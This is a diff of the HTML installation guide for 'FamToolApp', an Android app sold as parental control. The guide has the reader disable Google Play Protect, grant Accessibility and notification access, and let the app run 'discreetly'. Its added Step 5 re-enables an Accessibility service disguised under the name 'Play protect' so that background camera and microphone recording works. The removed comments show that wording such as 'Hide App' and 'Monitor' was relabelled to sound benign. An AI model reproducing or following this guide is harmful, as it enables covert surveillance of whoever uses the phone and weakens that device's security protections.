@@ -6,12 +6,9 @@
     <meta name="robots" content="index, follow">
     <meta name="rating" content="General">
     
-    <!-- मॉडिफिकेशन 1: SEO टैग्स को नए, सुरक्षित ब्रांड नाम और विवरण के साथ अपडेट किया गया है। -->
-    
     <link rel="icon" type="image/png" sizes="32x32" href="images/favicon.png">
     <link rel="apple-touch-icon" href="images/favicon.png">
 
-    <!-- ===== START: SEO and Schema for Installation-Guide.html ===== -->
     <title>How to Install FamToolApp | Step-by-Step Installation Guide</title>
     <meta name="description" content="Learn how to easily install FamToolApp on an Android device with our simple, step-by-step guide. Get set up in minutes.">
     <meta name="keywords" content="install FamToolApp, setup guide, Android parental control, family safety setup">
@@ -24,32 +21,19 @@
   "name": "How to Install FamToolApp",
   "description": "A step-by-step guide to installing the FamToolApp on an Android device.",
   "step": [
-    {
-      "@type": "HowToStep",
-      "name": "Download the App",
-      "text": "Download the FamToolApp APK file directly from our official website.",
-      "url": "https://famtoolapp.com/Download.html"
-    },
-    {
-      "@type": "HowToStep",
-      "name": "Allow Installation",
-      "text": "Tap on the downloaded file and allow installation from unknown sources if prompted."
-    },
-    {
-      "@type": "HowToStep",
-      "name": "Set Up Your Account",
-      "text": "Open the app, grant the necessary permissions, and set up your account to start monitoring."
-    }
+    { "@type": "HowToStep", "name": "Create Your Parent Account", "text": "First, create a secure account on our Parent Panel." },
+    { "@type": "HowToStep", "name": "Adjust Google Play Protect", "text": "Disable Google Play Protect to ensure the app's features run smoothly." },
+    { "@type": "HowToStep", "name": "Install, Login & Allow Permissions", "text": "Install the APK, sign in, and grant all necessary runtime permissions." },
+    { "@type": "HowToStep", "name": "Enable Required Services", "text": "Enable all necessary system services like Accessibility and Notification Listener." },
+    { "@type": "HowToStep", "name": "Activate Recording Features", "text": "To fix potential blocks on camera/mic recording, re-enable the Accessibility Service for the app." }
   ]
 }
 </script>
-<!-- ===== END: SEO and Schema for Installation-Guide.html ===== -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
 
     <style>
-        /* --- सीएसएस स्टाइल में कोई बदलाव नहीं किया गया है --- */
         :root {
             --color-purple-400: #a78bfa;
             --color-purple-500: #8b5cf6;
@@ -252,6 +236,81 @@
         .mockup-screen.scrollable::-webkit-scrollbar { width: 6px; }
         .mockup-screen.scrollable::-webkit-scrollbar-track { background: transparent; }
         .mockup-screen.scrollable::-webkit-scrollbar-thumb { background-color: var(--color-purple-500); border-radius: 6px; }
+        
+        .accessibility-guide-container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(17, 24, 39, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(55, 65, 81, 0.5);
+            border-radius: 1.5rem;
+            padding: 1rem;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.4);
+        }
+        .brand-toggle {
+            margin-bottom: 0.5rem;
+        }
+        .brand-toggle button {
+            width: 100%;
+            background: var(--dark-input-background);
+            border: 1px solid #4b5563;
+            color: var(--color-white);
+            padding: 1rem;
+            text-align: left;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .brand-toggle button:hover {
+            background-color: var(--color-gray-800);
+        }
+        .brand-toggle button.active {
+            background-color: var(--color-purple-600);
+            border-color: var(--color-purple-500);
+        }
+        .brand-toggle button::after {
+            content: '+';
+            font-size: 1.5rem;
+            transition: transform 0.3s ease-out;
+        }
+        .brand-toggle button.active::after {
+            transform: rotate(45deg);
+        }
+        .brand-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease-in-out;
+            background: rgba(0,0,0,0.2);
+            border-radius: 0 0 0.5rem 0.5rem;
+        }
+        .brand-content ol {
+            padding: 1.5rem 1.5rem 1.5rem 2.5rem;
+            margin: 0;
+            color: var(--color-gray-300);
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+        .brand-content ol li {
+            margin-bottom: 0.5rem;
+        }
+        .brand-content b {
+            color: var(--color-purple-400);
+            font-weight: 600;
+        }
+        .guide-note {
+            background: rgba(167, 139, 250, 0.1);
+            border: 1px solid var(--color-purple-500);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            text-align: center;
+        }
         .mockup-title {
             font-size: 24px;
             font-weight: 700;
@@ -530,7 +589,6 @@
     <header class="header">
         <div class="container">
             <div class="header-content">
-                <!-- मॉडिफिकेशन 2: लोगो का टेक्स्ट नए ब्रांड नाम "FamToolApp" से बदल दिया गया है। -->
                 <a href="https://famtoolapp.com" class="logo"><span>Fam</span>ToolApp</a>
                 <nav class="nav-desktop">
                     <a href="https://famtoolapp.com">Home</a>
@@ -568,7 +626,6 @@
         <section class="section-header">
             <div class="container">
                 <h1 class="section-title">Installation Guide</h1>
-                <!-- मॉडिफिकेशन 3: उपशीर्षक को "monitoring" से बदलकर "parental guidance" किया गया है। -->
                 <p class="section-subtitle">Follow these simple, visual steps to set up FamToolApp on your child's Android device and start your parental guidance journey.</p>
             </div>
         </section>
@@ -612,7 +669,6 @@
                 <div class="step-wrapper reverse" data-animation-group="play-protect">
                     <div class="step-content">
                         <div class="step-number">STEP 2</div>
-                        <!-- मॉडिफिकेशन 4: शीर्षक को नरम और अधिक जानकारीपूर्ण बनाया गया है। -->
                         <h2 class="step-title">Adjust Google Play Protect</h2>
                         <p class="step-description">Before installing the app, it's important to adjust Google Play Protect settings on the child's device. This ensures Android allows the app's safety features to run smoothly. Open the Play Store, tap your profile, then go to Play Protect and tap the settings gear to turn it off.</p>
                     </div>
@@ -662,8 +718,7 @@
                     <div class="step-content">
                         <div class="step-number">STEP 4</div>
                         <h2 class="step-title">Enable Required Services</h2>
-                        <!-- मॉडिफिकेशन 5: "Hide App" को "Complete Setup" से बदला गया है ताकि यह अधिक सकारात्मक लगे। -->
-                        <p class="step-description">In the final step, you need to enable the necessary system services for the app to function. Tapping on each option will take you to the phone's settings. There, you'll need to find **FamToolApp** and turn the service 'On'. Once all services are enabled, click the 'Complete Setup' button. The app will then run discreetly in the background.</p>
+                        <p class="step-description">In this step, you need to enable the necessary system services for the app to function. Tapping on each option will take you to the phone's settings. There, you'll need to find **FamToolApp** and turn the service 'On'. Once all services are enabled, click the 'Complete Setup' button. The app will then run discreetly in the background.</p>
                     </div>
                     <div class="mockup-container">
                         <div class="step-device-mockup">
@@ -693,6 +748,94 @@
                     </div>
                 </div>
 
+                <div class="step-wrapper" data-animation-group="accessibility-fix">
+                    <div class="step-content">
+                        <div class="step-number">STEP 5</div>
+                        <h2 class="step-title">Activate Recording Features</h2>
+                        <p class="step-description">Sometimes, the Android system may block background camera or mic access for security. To fix this, you must <b>re-enable</b> the Accessibility Service. Find your phone's brand below and follow the steps to turn the service <b>OFF</b> and then <b>ON</b> again.</p>
+                    </div>
+                    <div class="mockup-container">
+                        <div class="accessibility-guide-container">
+                            <div class="brand-toggle">
+                                <button>Samsung</button>
+                                <div class="brand-content">
+                                    <ol>
+                                        <li>Open <b>Settings</b></li>
+                                        <li>Go to <b>Accessibility</b></li>
+                                        <li>Select <b>Installed Services</b></li>
+                                        <li>Find and open <b>Play protect</b> (or System Service)</li>
+                                        <li>If it's ON → turn it <b>OFF</b>, then turn it <b>ON</b> again.</li>
+                                        <li>If it's OFF → simply turn it <b>ON</b>.</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            <div class="brand-toggle">
+                                <button>Xiaomi / Redmi / MI</button>
+                                <div class="brand-content">
+                                    <ol>
+                                        <li>Open <b>Settings</b></li>
+                                        <li>Go to <b>Additional Settings</b></li>
+                                        <li>Select <b>Accessibility</b></li>
+                                        <li>Open <b>Downloaded Apps / Installed Services</b></li>
+                                        <li>Find and enable <b>Play protect</b></li>
+                                        <li>If already enabled → <b>Disable</b> it and then <b>Enable</b> it again.</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            <div class="brand-toggle">
+                                <button>Vivo</button>
+                                <div class="brand-content">
+                                    <ol>
+                                        <li>Open <b>Settings</b></li>
+                                        <li>Go to <b>More Settings</b> → <b>Accessibility</b></li>
+                                        <li>Open <b>Installed Services</b></li>
+                                        <li>Select <b>Play protect</b> and enable it</li>
+                                        <li>If it's ON → turn it <b>OFF</b> and then back <b>ON</b>.</li>
+                                    </ol>
+                                </div>
+                            </div>
+                             <div class="brand-toggle">
+                                <button>Oppo / Realme</button>
+                                <div class="brand-content">
+                                    <ol>
+                                        <li>Open <b>Settings</b></li>
+                                        <li>Go to <b>Additional Settings</b> → <b>Accessibility</b></li>
+                                        <li>Select <b>Installed Services</b></li>
+                                        <li>Enable <b>Play protect</b></li>
+                                        <li>If it's already ON → <b>Disable</b> it and then <b>Re-enable</b> it.</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            <div class="brand-toggle">
+                                <button>OnePlus / Motorola / Nokia</button>
+                                <div class="brand-content">
+                                      <ol>
+                                        <li>Open <b>Settings</b></li>
+                                        <li>Go to <b>System</b> → <b>Accessibility</b> (or just <b>Accessibility</b>)</li>
+                                        <li>Select <b>Installed Services / Downloaded Services</b></li>
+                                        <li>Enable <b>Play protect</b> (Toggle OFF then ON if needed).</li>
+                                      </ol>
+                                </div>
+                            </div>
+                            <div class="brand-toggle">
+                                <button>Other Brands (Lava, Infinix, etc.)</button>
+                                <div class="brand-content">
+                                     <ol>
+                                        <li>Open <b>Settings</b></li>
+                                        <li>Go to <b>Accessibility</b></li>
+                                        <li>Select <b>Installed Services</b> or <b>Downloaded Apps</b></li>
+                                        <li>Enable <b>Play protect</b></li>
+                                        <li>If it's already ON → <b>Disable</b> it and then <b>Enable</b> it again.</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            <div class="guide-note">
+                                ⚠️ <b>Note:</b> Option names may vary slightly on different Android versions, but the path will be very similar.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
                 <div class="video-section" data-animation-group="videos">
                     <h2 class="section-title">Watch Video Tutorials</h2>
                     <p class="section-subtitle">For more detailed instructions, watch our video guides.</p>
@@ -711,7 +854,6 @@
                                 <svg fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z" /></svg>
                             </div>
                             <div>
-                                <!-- मॉडिफिकेशन 6: "Monitor" को "Guide" से बदला गया है। -->
                                 <p class="video-button-title">How to Guide Your Child</p>
                                 <p class="video-button-subtitle">Learn how to use the Parent Panel to review activities effectively.</p>
                             </div>
@@ -725,7 +867,6 @@
     <footer class="footer">
         <div class="container">
              <div class="footer-grid">
-                <!-- मॉडिफिकेशन 7: फुटर में ब्रांड का नाम बदला गया है। -->
                 <div>
                     <h4 class="footer-title">FamToolApp</h4>
                     <p>Providing parents with the tools they need to ensure their children's digital safety.</p>
@@ -766,7 +907,6 @@
     </footer>
 
     <script>
-        // --- जावास्क्रिप्ट में कोई बदलाव नहीं किया गया है ---
         document.addEventListener('DOMContentLoaded', function() {
             const mobileMenuButton = document.getElementById('mobile-menu-button');
             const mobileMenu = document.getElementById('mobile-menu');
@@ -936,6 +1076,30 @@
 
             document.querySelectorAll('.step-wrapper, .video-section').forEach(el => {
                 observer.observe(el);
+            });
+
+            const accordionButtons = document.querySelectorAll('.brand-toggle button');
+
+            accordionButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const content = button.nextElementSibling;
+                    const isActive = button.classList.contains('active');
+
+                    accordionButtons.forEach(btn => {
+                        if (btn !== button) {
+                            btn.classList.remove('active');
+                            btn.nextElementSibling.style.maxHeight = null;
+                        }
+                    });
+
+                    if (!isActive) {
+                        button.classList.add('active');
+                        content.style.maxHeight = content.scrollHeight + "px";
+                    } else {
+                        button.classList.remove('active');
+                        content.style.maxHeight = null;
+                    }
+                });
             });
         });
     </script>
